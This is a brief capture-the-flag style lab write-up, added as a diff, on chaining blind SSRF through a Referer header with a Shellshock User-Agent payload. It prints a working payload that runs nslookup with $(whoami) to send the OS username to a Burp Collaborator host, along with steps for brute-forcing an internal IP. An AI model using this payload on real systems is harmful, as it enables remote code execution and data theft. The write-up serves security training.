@@ -1,0 +1,26 @@
+LAB INFO: Blind SSRF with Shellshock exploitation
+
+Shellshock exploitation ==> This means a RCE in the bash 
+
+MORE INFO:   This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
+
+To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 
+
+
+VULNERABLE_PAGE:  Refrer header when the product page is loading............
+
+ct9s3vtsq8cip9bisve7lsxi99f03qrf.oastify.com ==> This is my burp collabarator
+
+STEPS TO SOLVE:::
+1. Open the lab and add the extension called collabarator everywhre by james kettel and portswigger
+2. And then it will show that the user agent and the Referer header are VULNERABLE
+3. Now, add the Shellshock in the user-agent and our internal ip in the Referer header
+
+Shellshock ==> User-Agent: () { :; }; /usr/bin/nslookup $(whoami).8pyozrpom48el57eora3hote55bwznnc.oastify.com
+and In refrer field we add: 
+Referer: http://192.168.0.X/8080 we will bruteforce the X and it will give reply in the collabarator.
+4. And the we get the username of the OS and the lab is being solved.
+
+FINALLY THE LAB IS BEING SOLVED.
+
+
